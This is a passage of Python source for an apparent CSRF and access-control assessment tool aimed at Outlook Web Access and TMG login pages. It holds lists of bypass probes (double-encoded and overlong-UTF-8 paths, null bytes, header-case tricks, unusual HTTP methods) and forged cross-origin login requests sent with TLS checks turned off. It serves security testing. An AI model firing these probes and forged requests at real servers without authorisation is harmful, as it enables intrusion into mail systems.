#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced CSRF Assessment Tool for TMG/OWA and Modern Web Applications
Version 2.0 - Enhanced with dynamic token detection, cookie analysis, and bypass tests

Changes:
- Dynamic CSRF token extraction and handling
- Enhanced cookie analysis (SameSite, Secure, HttpOnly flags)
- Auto-detection of authentication endpoints
- Additional bypass tests (JSON, multipart, custom headers)
- Improved result reporting with vulnerability confidence scoring
- Support for testing with valid credentials
- CORS misconfiguration detection
- Content Security Policy (CSP) analysis
"""

import http.server
import socketserver
import ssl
import urllib.parse
import sys
import os
import re
import json
import time
from html import escape
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse, urljoin

try:
    import requests
except ImportError:
    requests = None

# Default HTTP UA and timeouts
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
TIMEOUT = 15

# Color codes for console output
class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"

def cprint(text: str, color: str = Colors.RESET):
    """Print colored text to console"""
    print(f"{color}{text}{Colors.RESET}")

# Environment variable helpers
def env(name: str, default: str) -> str:
    return os.environ.get(name, default)

def prompt(prompt_text: str, default: Optional[str] = None) -> str:
    """Console prompt with default value"""
    suffix = f" [{default}]" if default else ""
    try:
        val = input(f"{prompt_text}{suffix}: ").strip()
        return val if val else (default or "")
    except EOFError:
        return default or ""

# Base configuration
TARGET_BASE = env("TARGET_BASE", "https://example.com")
PUBLIC_HOST = env("PUBLIC_HOST", "127.0.0.1")
LISTEN_PORT = int(env("LISTEN_PORT", "4444"))
PUBLIC_PORT = int(env("PUBLIC_PORT", str(LISTEN_PORT)))
LISTEN_HOST = env("LISTEN_HOST", "0.0.0.0")

# Authentication endpoints (will be auto-detected)
COOKIEAUTH_PATH = env("COOKIEAUTH_PATH", "/CookieAuth.dll?Logon")
GET_LOGON_PATH = env("GET_LOGON_PATH", "/CookieAuth.dll?GetLogon?curl=Z2FowaZ2F&reason=0&formdir=1")
AUTHOWA_PATH = env("AUTHOWA_PATH", "/owa/auth.owa")
PUBLISHED_SAFE_PATH = env("PUBLISHED_SAFE_PATH", "/owa/")

# CSRF test credentials
CSRF_USERNAME = env("CSRF_USERNAME", "test.user")
CSRF_PASSWORD = env("CSRF_PASSWORD", "NotARealPass123")
CSRF_SUBMIT_NAME = env("CSRF_SUBMIT_NAME", "SubmitCreds")
CSRF_SUBMIT_VALUE = env("CSRF_SUBMIT_VALUE", "Sign in")

# Advanced CSRF parameters
CSRF_FLAGS = env("CSRF_FLAGS", "0")
CSRF_FORCEDOWNLEVEL = env("CSRF_FORCEDOWNLEVEL", "0")
CSRF_FORMDIR = env("CSRF_FORMDIR", "1")
CSRF_TRUSTED = env("CSRF_TRUSTED", "0")
CSRF_ISUTF8 = env("CSRF_ISUTF8", "1")
CSRF_CURL = env("CSRF_CURL", "Z2FowaZ2F")
CSRF_DESTINATION = env("CSRF_DESTINATION", "/owa/")

# Optional TLS
CERT_FILE = env("CERT_FILE", "")
KEY_FILE = env("KEY_FILE", "")

# Interactive startup
cprint("\n=== Enhanced CSRF Assessment Tool ===", Colors.CYAN)
cprint("Interactive Configuration", Colors.YELLOW)

_interactive_target = prompt("Enter target base URL (TARGET_BASE)", TARGET_BASE)
_interactive_public = prompt("Enter your public IP/host for PoC access (PUBLIC_HOST)", PUBLIC_HOST)
_interactive_port = prompt("Enter listen port (LISTEN_PORT/PUBLIC_PORT)", str(LISTEN_PORT))
_interactive_user = prompt("Enter test username (CSRF_USERNAME)", CSRF_USERNAME)
_interactive_pass = prompt("Enter test password (CSRF_PASSWORD)", "********")

TARGET_BASE = _interactive_target or TARGET_BASE
PUBLIC_HOST = _interactive_public or PUBLIC_HOST
try:
    LISTEN_PORT = int(_interactive_port)
    PUBLIC_PORT = LISTEN_PORT if not env("PUBLIC_PORT", "") else PUBLIC_PORT
except Exception:
    pass

if _interactive_user:
    CSRF_USERNAME = _interactive_user
if _interactive_pass and _interactive_pass != "********":
    CSRF_PASSWORD = _interactive_pass

# Default Origin/Referer
FAKE_ORIGIN_DEFAULT = env("FAKE_ORIGIN", f"http://{PUBLIC_HOST}:{PUBLIC_PORT}")
FAKE_REFERER_DEFAULT = env("FAKE_REFERER", "")

# State management
STATE: Dict[str, Any] = {
    "target_base": TARGET_BASE.strip(),
    "cookieauth_url": "",
    "authowa_url": "",
    "get_logon_url": "",
    "safe_url": "",
    "cookie_report": "",
    "auto_hidden": {},
    "csrf_tokens": {},
    "warnings": [],
    "detected_endpoints": [],
    "vulnerability_score": 0,
    "protection_mechanisms": [],
}

def absolute_url(base: str, path: str) -> str:
    """Join base and path into absolute URL"""
    if re.match(r"^https?://", path, re.I):
        return path
    base = base.rstrip('/')
    path = path.lstrip('/')
    return f"{base}/{path}"

def detect_endpoints() -> List[str]:
    """Auto-detect common authentication endpoints"""
    if requests is None:
        return []
    
    detected = []
    common_paths = [
        "/owa/auth.owa",
        "/owa/",
        "/ecp/",
        "/rpc/",
        "/autodiscover/",
        "/Microsoft-Server-ActiveSync",
        "/ews/exchange.asmx",
        "/api/",
        "/auth/",
        "/login",
        "/signin",
    ]
    
    try:
        for path in common_paths:
            url = absolute_url(TARGET_BASE, path)
            try:
                r = requests.get(url, timeout=5, verify=False, allow_redirects=True)
                if r.status_code in [200, 302, 401]:
                    detected.append({
                        "path": path,
                        "url": url,
                        "status": r.status_code,
                        "title": extract_page_title(r.text)
                    })
            except:
                pass
    except Exception as e:
        STATE["warnings"].append(f"Endpoint detection failed: {e}")
    
    return detected

def extract_page_title(html: str) -> str:
    """Extract page title from HTML"""
    match = re.search(r'<title>([^<]+)</title>', html, re.I)
    return match.group(1).strip() if match else ""

def parse_set_cookie_flags(set_cookie_headers: List[str]) -> List[Dict[str, Any]]:
    """Extract cookie flags from Set-Cookie headers"""
    res = []
    for sc in set_cookie_headers:
        parts = [p.strip() for p in sc.split(';')]
        kv = {
            "raw": sc,
            "secure": False,
            "httponly": False,
            "samesite": None,
            "expires": None,
            "domain": None,
            "path": None,
            "cookie_name": "(unknown)",
            "cookie_val_preview": ""
        }
        
        if parts and '=' in parts[0]:
            k, v = parts[0].split('=', 1)
            kv['cookie_name'] = k
            kv['cookie_val_preview'] = (v[:20] + '...') if len(v) > 20 else v
        
        for p in parts[1:]:
            pl = p.lower()
            if pl == 'secure':
                kv['secure'] = True
            elif pl == 'httponly':
                kv['httponly'] = True
            elif pl.startswith('samesite='):
                kv['samesite'] = pl.split('=', 1)[1].capitalize()
            elif pl.startswith('expires='):
                kv['expires'] = p.split('=', 1)[1][:30]
            elif pl.startswith('domain='):
                kv['domain'] = p.split('=', 1)[1]
            elif pl.startswith('path='):
                kv['path'] = p.split('=', 1)[1]
        
        res.append(kv)
    return res

def analyze_cookie_security(cookies: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Analyze cookie security posture"""
    analysis = {
        "total_cookies": len(cookies),
        "samesite_missing": 0,
        "samesite_none": 0,
        "samesite_lax": 0,
        "samesite_strict": 0,
        "secure_missing": 0,
        "httponly_missing": 0,
        "csrf_risk_level": "LOW",
        "recommendations": []
    }
    
    for cookie in cookies:
        if not cookie.get('samesite'):
            analysis['samesite_missing'] += 1
        elif cookie['samesite'].lower() == 'none':
            analysis['samesite_none'] += 1
        elif cookie['samesite'].lower() == 'lax':
            analysis['samesite_lax'] += 1
        elif cookie['samesite'].lower() == 'strict':
            analysis['samesite_strict'] += 1
        
        if not cookie.get('secure'):
            analysis['secure_missing'] += 1
        if not cookie.get('httponly'):
            analysis['httponly_missing'] += 1
    
    # Determine risk level
    if analysis['samesite_missing'] > 0 or analysis['samesite_none'] > 0:
        analysis['csrf_risk_level'] = "HIGH"
        analysis['recommendations'].append("Set SameSite=Strict or SameSite=Lax on all cookies")
    elif analysis['samesite_lax'] > 0:
        analysis['csrf_risk_level'] = "MEDIUM"
        analysis['recommendations'].append("Consider using SameSite=Strict for sensitive operations")
    
    if analysis['secure_missing'] > 0:
        analysis['recommendations'].append("Set Secure flag on all cookies")
    if analysis['httponly_missing'] > 0:
        analysis['recommendations'].append("Set HttpOnly flag on session cookies")
    
    return analysis

def pretty_cookie_report(items: List[Dict[str, Any]], analysis: Optional[Dict[str, Any]] = None) -> str:
    """Format cookie report with security analysis"""
    if not items:
        return "(no Set-Cookie headers observed)"
    
    output = []
    for i in items:
        flags = []
        if i.get('secure'): flags.append("Secure")
        if i.get('httponly'): flags.append("HttpOnly")
        if i.get('samesite'): flags.append(f"SameSite={i['samesite']}")
        
        output.append(f"- {i.get('cookie_name','(unknown)')}: {', '.join(flags) if flags else 'NO FLAGS'}")
        output.append(f"  Value: {i.get('cookie_val_preview','')}")
    
    if analysis:
        output.append("\n--- Security Analysis ---")
        output.append(f"Total Cookies: {analysis['total_cookies']}")
        output.append(f"CSRF Risk Level: {analysis['csrf_risk_level']}")
        output.append(f"Missing SameSite: {analysis['samesite_missing']}")
        output.append(f"SameSite=None: {analysis['samesite_none']}")
        output.append(f"SameSite=Lax: {analysis['samesite_lax']}")
        output.append(f"SameSite=Strict: {analysis['samesite_strict']}")
        output.append(f"Missing Secure: {analysis['secure_missing']}")
        output.append(f"Missing HttpOnly: {analysis['httponly_missing']}")
        
        if analysis['recommendations']:
            output.append("\nRecommendations:")
            for rec in analysis['recommendations']:
                output.append(f"  - {rec}")
    
    return "\n".join(output)

def extract_hidden_inputs(html: str) -> Dict[str, str]:
    """Extract hidden input fields from HTML form"""
    found: Dict[str, str] = {}
    
    # Pattern 1: <input type="hidden" name="..." value="...">
    pattern1 = r'<input\b[^>]*type=["\']?hidden["\']?[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>'
    for match in re.finditer(pattern1, html, re.I):
        name, value = match.groups()
        found[name] = value
    
    # Pattern 2: <input name="..." type="hidden" value="...">
    pattern2 = r'<input\b[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']?hidden["\']?[^>]*value=["\']([^"\']*)["\'][^>]*>'
    for match in re.finditer(pattern2, html, re.I):
        name, value = match.groups()
        if name not in found:
            found[name] = value
    
    return found

def extract_csrf_tokens(html: str) -> Dict[str, str]:
    """Extract potential CSRF tokens from various sources"""
    tokens: Dict[str, str] = {}
    
    # Common CSRF token patterns
    csrf_patterns = [
        # Hidden input fields with token-like names
        (r'<input\b[^>]*name=["\']([^"\']*(?:csrf|token|__request|verification)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\'][^>]*type=["\']?hidden["\']?[^>]*>', 'input'),
        # Meta tags
        (r'<meta\b[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\'][^>]*>', 'meta'),
        # JavaScript variables
        (r'var\s+(?:csrf|token)\s*=\s*[\'"]([^\'"]+)[\'"]', 'js_var'),
    ]
    
    for pattern, source in csrf_patterns:
        for match in re.finditer(pattern, html, re.I):
            if source == 'input':
                name, value = match.groups()
                tokens[name] = value
                cprint(f"  [+] Found CSRF token field: {name}", Colors.GREEN)
            elif source == 'meta':
                tokens['csrf-token'] = match.group(1)
                cprint(f"  [+] Found CSRF token in meta tag", Colors.GREEN)
            elif source == 'js_var':
                tokens['csrf-js'] = match.group(1)
                cprint(f"  [+] Found CSRF token in JS variable", Colors.GREEN)
    
    return tokens

def extract_csp(html: str) -> Optional[str]:
    """Extract Content Security Policy from HTML"""
    # Meta tag CSP
    match = re.search(r'<meta\s+http-equiv=["\']Content-Security-Policy["\'][^>]*content=["\']([^"\']+)["\'][^>]*>', html, re.I)
    if match:
        return match.group(1)
    
    return None

def warm_up() -> None:
    """Warm up target to collect cookies, tokens, and analyze security"""
    if requests is None:
        STATE["warnings"].append("requests module not installed — warm-up skipped")
        cprint("[-] requests module not installed", Colors.RED)
        return
    
    cprint("\n[+] Performing warm-up analysis...", Colors.YELLOW)
    
    try:
        # Auto-detect endpoints
        cprint("[*] Auto-detecting authentication endpoints...", Colors.CYAN)
        detected = detect_endpoints()
        STATE["detected_endpoints"] = detected
        
        if detected:
            cprint(f"[+] Found {len(detected)} endpoints:", Colors.GREEN)
            for ep in detected:
                cprint(f"    - {ep['path']} (Status: {ep['status']})", Colors.GREEN)
        else:
            cprint("[-] No additional endpoints detected", Colors.YELLOW)
        
        # Build URLs
        STATE["cookieauth_url"] = absolute_url(TARGET_BASE, COOKIEAUTH_PATH)
        STATE["authowa_url"] = absolute_url(TARGET_BASE, AUTHOWA_PATH)
        STATE["get_logon_url"] = absolute_url(TARGET_BASE, GET_LOGON_PATH)
        STATE["safe_url"] = absolute_url(TARGET_BASE, PUBLISHED_SAFE_PATH)
        
        # Fetch login page
        cprint(f"[*] Fetching login page: {STATE['get_logon_url']}", Colors.CYAN)
        s = requests.Session()
        s.headers.update({"User-Agent": UA})
        
        r = s.get(STATE["get_logon_url"], timeout=TIMEOUT, verify=False, allow_redirects=True)
        
        # Extract cookies
        set_cookie = r.headers.get('Set-Cookie')
        all_sc = []
        if set_cookie:
            raw = getattr(getattr(r, 'raw', None), 'headers', None)
            all_sc = raw.get_all('Set-Cookie') if raw and hasattr(raw, 'get_all') else [set_cookie]
        
        cookies = parse_set_cookie_flags(all_sc)
        cookie_analysis = analyze_cookie_security(cookies)
        STATE["cookie_report"] = pretty_cookie_report(cookies, cookie_analysis)
        
        cprint("[+] Cookie analysis complete:", Colors.GREEN)
        cprint(STATE["cookie_report"], Colors.CYAN)
        
        # Extract hidden inputs
        cprint("[*] Extracting hidden form fields...", Colors.CYAN)
        STATE["auto_hidden"] = extract_hidden_inputs(r.text)
        if STATE["auto_hidden"]:
            cprint(f"[+] Found {len(STATE['auto_hidden'])} hidden fields:", Colors.GREEN)
            for k, v in list(STATE["auto_hidden"].items())[:5]:
                cprint(f"    {k}: {v[:30]}", Colors.GREEN)
        else:
            cprint("[-] No hidden fields found", Colors.YELLOW)
        
        # Extract CSRF tokens
        cprint("[*] Searching for CSRF tokens...", Colors.CYAN)
        STATE["csrf_tokens"] = extract_csrf_tokens(r.text)
        if STATE["csrf_tokens"]:
            cprint(f"[+] Found {len(STATE['csrf_tokens'])} potential CSRF tokens", Colors.GREEN)
            STATE["protection_mechanisms"].append("CSRF tokens detected")
        else:
            cprint("[!] No CSRF tokens found - potential vulnerability", Colors.RED)
            STATE["vulnerability_score"] += 30
        
        # Check SameSite protection
        if cookie_analysis['csrf_risk_level'] == "HIGH":
            cprint("[!] HIGH CSRF risk due to missing SameSite attributes", Colors.RED)
            STATE["vulnerability_score"] += 40
        elif cookie_analysis['csrf_risk_level'] == "MEDIUM":
            cprint("[!] MEDIUM CSRF risk - SameSite=Lax may not be sufficient", Colors.YELLOW)
            STATE["vulnerability_score"] += 20
        
        # Extract CSP
        csp = extract_csp(r.text)
        if csp:
            cprint(f"[+] Found Content Security Policy", Colors.GREEN)
            STATE["protection_mechanisms"].append("CSP detected")
        else:
            cprint("[!] No CSP detected", Colors.YELLOW)
        
        # Check CORS headers
        cors_origin = r.headers.get('Access-Control-Allow-Origin')
        if cors_origin:
            cprint(f"[+] CORS header found: {cors_origin}", Colors.GREEN)
            if cors_origin == "*":
                cprint("[!] WARNING: CORS allows any origin (*):", Colors.RED)
                STATE["vulnerability_score"] += 15
        
        cprint("\n[+] Warm-up complete!", Colors.GREEN)
        cprint(f"[i] Current vulnerability score: {STATE['vulnerability_score']}/100", Colors.CYAN)
        
    except Exception as e:
        STATE["warnings"].append(f"Warm-up failed: {e}")
        cprint(f"[-] Warm-up failed: {e}", Colors.RED)

# Build CSRF payload
def build_payload(include_tokens: bool = True) -> Dict[str, str]:
    """Build CSRF payload with optional token inclusion"""
    p: Dict[str, str] = {}
    
    def put(k, v):
        if v is not None and str(v) != "":
            p[k] = str(v)
    
    # Standard form fields
    put("username", CSRF_USERNAME)
    put("password", CSRF_PASSWORD)
    put(CSRF_SUBMIT_NAME, CSRF_SUBMIT_VALUE)
    put("flags", CSRF_FLAGS)
    put("forcedownlevel", CSRF_FORCEDOWNLEVEL)
    put("formdir", CSRF_FORMDIR)
    put("trusted", CSRF_TRUSTED)
    put("isUtf8", CSRF_ISUTF8)
    put("curl", CSRF_CURL)
    put("destination", CSRF_DESTINATION)
    
    # Auto-detected hidden fields
    for k, v in STATE["auto_hidden"].items():
        if k not in p:
            p[k] = v
    
    # CSRF tokens (if requested)
    if include_tokens:
        for k, v in STATE["csrf_tokens"].items():
            if k not in p:
                p[k] = v
    
    return p

def resolve_origin_and_referer(origin: Optional[str], referer: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
    """Resolve Origin and Referer headers"""
    fo = (origin or FAKE_ORIGIN_DEFAULT)
    fr = (referer or FAKE_REFERER_DEFAULT)
    
    if not fr and fo:
        fr = fo.rstrip('/') + '/poc'
    
    if fo == "__NONE__":
        fo = None
    if fr == "__NONE__":
        fr = None
    
    return fo, fr

# Advanced bypass tests
ENCODING_TESTS = [
    ("double_percent", lambda base: base.rstrip('/') + "/%256f%2577%2561/"),
    ("encoded_slash", lambda base: base.rstrip('/') + "/%2fowa%2f"),
    ("mixed_case_hex", lambda base: base.rstrip('/') + "/%2FOWA%2f"),
    ("utf8_overlong_like", lambda base: base.rstrip('/') + "/%c0%afowa%2f"),
    ("double_encode", lambda base: base.rstrip('/') + "/%252fowa%252f"),
]

PATH_TESTS = [
    ("dot_segments", lambda base: base.rstrip('/') + "/owa/../owa/"),
    ("double_slash", lambda base: base.rstrip('/') + "//owa//"),
    ("backslash_encoded", lambda base: base.rstrip('/') + "/%5cowa%5c"),
    ("semicolon_path", lambda base: base.rstrip('/') + "/owa/;param"),
    ("null_byte", lambda base: base.rstrip('/') + "/owa/%00"),
    ("unicode_normalize", lambda base: base.rstrip('/') + "/owa\u200c/"),
]

HEADER_TESTS = [
    ("content_type_json", {"Content-Type": "application/json"}),
    ("content_type_text", {"Content-Type": "text/plain"}),
    ("content_type_multipart", {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary"}),
    ("origin_capitalized", {"OrIgIn": FAKE_ORIGIN_DEFAULT}),
    ("referer_capitalized", {"ReFeReR": FAKE_ORIGIN_DEFAULT + "/poc"}),
    ("origin_null", {"Origin": "null"}),
    ("referer_null", {"Referer": "null"}),
    ("no_origin", {}),
    ("no_referer", {}),
    ("x_requested_with", {"X-Requested-With": "XMLHttpRequest"}),
]

METHOD_TESTS = [
    ("OPTIONS", "OPTIONS"),
    ("PUT", "PUT"),
    ("TRACE", "TRACE"),
    ("DELETE", "DELETE"),
    ("PATCH", "PATCH"),
]

PAYLOAD_VARIATIONS = [
    ("standard_form", "application/x-www-form-urlencoded", lambda p: p),
    ("json_payload", "application/json", lambda p: json.dumps(p)),
    ("multipart_form", "multipart/form-data", lambda p: p),
]

def http_try(method: str, url: str, headers: Optional[Dict[str, str]] = None,
             data: Optional[Any] = None, allow_redirects: bool = True) -> Tuple[int, str, str, str]:
    """Perform HTTP request and return detailed results"""
    if requests is None:
        return (0, "", "", "requests not available")
    
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    
    try:
        r = sess.request(
            method=method,
            url=url,
            headers=headers or {},
            data=data,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=allow_redirects
        )
        
        loc = r.url if allow_redirects else r.headers.get("Location", "")
        sc = r.headers.get("Set-Cookie", "")
        body_preview = r.text[:200] if r.text else ""
        
        return (r.status_code, loc, sc, body_preview)
    except Exception as e:
        return (-1, str(e), "", "")

def test_csrf_protection(origin: Optional[str], referer: Optional[str], 
                        include_tokens: bool = False) -> Dict[str, Any]:
    """Test CSRF protection by sending request with/without valid tokens"""
    fo, fr = resolve_origin_and_referer(origin, referer)
    
    url = STATE["cookieauth_url"]
    payload = build_payload(include_tokens=include_tokens)
    
    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    
    if fo is not None:
        headers["Origin"] = fo
    if fr is not None:
        headers["Referer"] = fr
    
    # Determine content type
    content_type = "application/x-www-form-urlencoded"
    if "json" in str(headers.get("Content-Type", "")).lower():
        data_to_send = json.dumps(payload)
        content_type = "application/json"
    else:
        data_to_send = payload
    
    headers["Content-Type"] = content_type
    
    sess = requests.Session()
    sess.headers.update({"User-Agent": UA})
    
    try:
        # Get initial cookies
        sess.get(STATE["get_logon_url"], timeout=TIMEOUT, verify=False, allow_redirects=True)
        
        # Send CSRF request
        r = sess.post(
            url,
            data=data_to_send,
            headers=headers,
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        
        result = {
            "status_code": r.status_code,
            "final_url": r.url,
            "success": False,
            "indicators": [],
            "response_preview": r.text[:300] if r.text else ""
        }
        
        # Check for successful authentication
        if r.status_code in [200, 302]:
            # Check if redirected to OWA/dashboard
            if "/owa/" in r.url.lower() or "inbox" in r.text.lower() or "mailbox" in r.text.lower():
                result["success"] = True
                result["indicators"].append("Redirected to OWA interface")
            
            # Check for session cookies
            if "Set-Cookie" in r.headers and "session" in r.headers["Set-Cookie"].lower():
                result["indicators"].append("Session cookie set")
            
            # Check for authentication indicators
            auth_indicators = ["logout", "sign out", "welcome", "mailbox", "folders"]
            if any(ind.lower() in r.text.lower() for ind in auth_indicators):
                result["success"] = True
                result["indicators"].append("Authentication indicators found in response")
        
        # Check for CSRF protection indicators
        if r.status_code in [400, 403, 419]:
            result["indicators"].append(f"Blocked by server (status {r.status_code})")
        
        if "csrf" in r.text.lower() or "token" in r.text.lower() or "invalid" in r.text.lower():
            result["indicators"].append("CSRF error message in response")
        
        if "GetLogon" in r.url or "login" in r.url.lower():
            result["indicators"].append("Redirected back to login page")
        
        return result
        
    except Exception as e:
        return {
            "status_code": -1,
            "final_url": "",
            "success": False,
            "indicators": [f"Exception: {str(e)}"],
            "response_preview": ""
        }

def run_suite(origin: Optional[str], referer: Optional[str]) -> Dict[str, Any]:
    """Run comprehensive security assessment suite"""
    fo, fr = resolve_origin_and_referer(origin, referer)
    
    results = {
        "origin": fo or "(none)",
        "referer": fr or "(none)",
        "encoding": [],
        "path": [],
        "headers": [],
        "methods": [],
        "payloads": [],
        "summary": {
            "vulnerable_endpoints": 0,
            "total_tests": 0,
            "bypass_success": 0
        }
    }
    
    common_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
    if fo is not None:
        common_headers["Origin"] = fo
    if fr is not None:
        common_headers["Referer"] = fr
    
    # Encoding tests
    cprint("\n[*] Running encoding bypass tests...", Colors.CYAN)
    for name, builder in ENCODING_TESTS:
        url = builder(STATE["safe_url"])
        st, loc, sc, body = http_try("GET", url, headers=common_headers, allow_redirects=False)
        vulnerable = st in [200, 301, 302] and "owa" in loc.lower()
        results["encoding"].append({
            "case": name,
            "url": url,
            "status": st,
            "location": loc,
            "cookie": sc[:80] if sc else "",
            "vulnerable": vulnerable
        })
        if vulnerable:
            results["summary"]["bypass_success"] += 1
        results["summary"]["total_tests"] += 1
    
    # Path traversal tests
    cprint("[*] Running path manipulation tests...", Colors.CYAN)
    for name, builder in PATH_TESTS:
        url = builder(STATE["safe_url"])
        st, loc, sc, body = http_try("GET", url, headers=common_headers, allow_redirects=False)
        vulnerable = st in [200, 301, 302]
        results["path"].append({
            "case": name,
            "url": url,
            "status": st,
            "location": loc,
            "cookie": sc[:80] if sc else "",
            "vulnerable": vulnerable
        })
        if vulnerable:
            results["summary"]["bypass_success"] += 1
        results["summary"]["total_tests"] += 1
    
    # Header manipulation tests
    cprint("[*] Running header manipulation tests...", Colors.CYAN)
    for name, hdrs in HEADER_TESTS:
        h = dict(common_headers)
        h.update(hdrs)
        st, loc, sc, body = http_try("POST", STATE["authowa_url"], headers=h, 
                                     data={"probe": "1"}, allow_redirects=False)
        blocked = st in [400, 403]
        results["headers"].append({
            "case": name,
            "status": st,
            "location": loc,
            "cookie": sc[:80] if sc else "",
            "blocked": blocked
        })
        if not blocked:
            results["summary"]["bypass_success"] += 1
        results["summary"]["total_tests"] += 1
    
    # HTTP method tests
    cprint("[*] Running HTTP method tests...", Colors.CYAN)
    for name, method in METHOD_TESTS:
        st, loc, sc, body = http_try(method, STATE["safe_url"], headers=common_headers, allow_redirects=False)
        allowed = st not in [405, 501]
        results["methods"].append({
            "case": name,
            "method": method,
            "status": st,
            "location": loc,
            "cookie": sc[:80] if sc else "",
            "allowed": allowed
        })
        if allowed and method not in ["GET", "POST"]:
            results["summary"]["bypass_success"] += 1
        results["summary"]["total_tests"] += 1
    
    # Payload variation tests
    cprint("[*] Running payload variation tests...", Colors.CYAN)
    for name, content_type, transform in PAYLOAD_VARIATIONS:
        h = dict(common_headers)
        h["Content-Type"] = content_type
        data = transform(build_payload(include_tokens=False))
        result = test_csrf_protection(fo, fr, include_tokens=False)
        results["payloads"].append({
            "case": name,
            "content_type": content_type,
            "status": result["status_code"],
            "success": result["success"],
            "indicators": ", ".join(result["indicators"][:2])
        })
        if result["success"]:
            results["summary"]["bypass_success"] += 1
        results["summary"]["total_tests"] += 1
    
    cprint(f"\n[+] Suite complete: {results['summary']['bypass_success']}/{results['summary']['total_tests']} bypasses successful", 
           Colors.GREEN if results['summary']['bypass_success'] > 0 else Colors.YELLOW)
    
    return results

def build_payload_kv(payload: Dict[str, str]) -> str:
    """Format payload as key-value pairs"""
    return "\n".join([f"{k}={v}" for k, v in payload.items()])

# ---------- HTML Layout with Enhanced Reporting ----------

def html_layout(title: str, body_html: str) -> str:
    """Wrap content with enhanced HTML layout"""
    return f"""<!doctype html>
<html>
<head>
  <meta charset='utf-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1'>
  <title>{escape(title)}</title>
  <style>
    :root {{
      --bg: #ffffff; --fg: #111827; --card: #f6f8fa; --btn-bg: #111827; --btn-fg: #ffffff;
      --border: #e5e7eb; --link: #2563eb; --success: #10b981; --warning: #f59e0b; --danger: #ef4444;
      --info: #3b82f6; --high: #ef4444; --medium: #f59e0b; --low: #10b981;
    }}
    :root[data-theme="dark"] {{
      --bg: #0b0f14; --fg: #e5e7eb; --card: #0f1620; --btn-bg: #2563eb; --btn-fg: #ffffff;
      --border: #1f2937; --link:#60a5fa; --success: #10b981; --warning: #f59e0b; --danger: #ef4444;
      --info: #3b82f6; --high: #ef4444; --medium: #f59e0b; --low: #10b981;
    }}
    html, body {{ height: 100%; }}
    body {{
      margin: 2rem; max-width: 1200px; font-family: system-ui, Segoe UI, Roboto, Arial, sans-serif;
      background: var(--bg); color: var(--fg); line-height: 1.6;
    }}
    a {{ color: var(--link); text-decoration: none; }}
    a:hover {{ text-decoration: underline; }}
    a.btn {{ display:inline-block; background: var(--btn-bg); color: var(--btn-fg); 
            padding:.5rem 1rem; border-radius:6px; margin-right:8px; text-decoration: none; }}
    a.btn:hover {{ opacity: 0.9; }}
    code, pre {{ background: var(--card); padding:.25rem .5rem; border-radius:4px; overflow-x: auto; }}
    pre {{ white-space: pre-wrap; word-wrap: break-word; }}
    .card {{ border:1px solid var(--border); border-radius:8px; padding:16px; margin-bottom:16px; }}
    .card-header {{ font-size: 1.1em; font-weight: bold; margin-bottom: 12px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }}
    table {{ border-collapse: collapse; width:100%; margin: 8px 0; }}
    th, td {{ border:1px solid var(--border); padding:8px 12px; text-align:left; }}
    th {{ background: var(--card); font-weight: bold; }}
    tr:hover td {{ background: var(--card); }}
    .badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; }}
    .badge-high {{ background: var(--high); color: white; }}
    .badge-medium {{ background: var(--medium); color: white; }}
    .badge-low {{ background: var(--low); color: white; }}
    .badge-info {{ background: var(--info); color: white; }}
    .progress-bar {{ width: 100%; background: var(--card); border-radius: 4px; overflow: hidden; margin: 8px 0; }}
    .progress-fill {{ height: 20px; background: linear-gradient(90deg, var(--low), var(--medium), var(--high)); 
                     display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }}
    nav {{ display:flex; justify-content:space-between; align-items:center; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 2px solid var(--border); }}
    #themeToggle {{ background: var(--btn-bg); color: var(--btn-fg); border:none; padding:.4rem .8rem; border-radius:6px; cursor:pointer; }}
    .indicator {{ margin: 4px 0; padding: 8px; background: var(--card); border-left: 4px solid var(--info); }}
    .indicator.success {{ border-left-color: var(--success); }}
    .indicator.warning {{ border-left-color: var(--warning); }}
    .indicator.danger {{ border-left-color: var(--danger); }}
  </style>
  <script>
    (function() {{
      try {{
        var t = localStorage.getItem('theme') || 'light';
        document.documentElement.setAttribute('data-theme', t);
        window.__theme = t;
      }} catch(e) {{}}
    }})();
    function toggleTheme() {{
      var cur = document.documentElement.getAttribute('data-theme') || 'light';
      var next = (cur === 'dark') ? 'light' : 'dark';
      document.documentElement.setAttribute('data-theme', next);
      try {{ localStorage.setItem('theme', next); }} catch(e) {{ }}
      var btn = document.getElementById('themeToggle');
      if (btn) btn.textContent = 'Theme: ' + (next === 'dark' ? 'Dark' : 'Light');
    }}
    window.addEventListener('DOMContentLoaded', function() {{
      var cur = document.documentElement.getAttribute('data-theme') || 'light';
      var btn = document.getElementById('themeToggle');
      if (btn) btn.textContent = 'Theme: ' + (cur === 'dark' ? 'Dark' : 'Light');
    }});
  </script>
</head>
<body>
  <nav>
    <div><strong>Enhanced CSRF Assessment Tool v2.0</strong></div>
    <div><button id='themeToggle' onclick='toggleTheme()' title='Toggle light/dark theme'>Theme</button></div>
  </nav>
  {body_html}
</body>
</html>"""

# ---------- Pages ----------

def page_index() -> str:
    """Main overview page"""
    vuln_score = STATE.get('vulnerability_score', 0)
    risk_level = "LOW"
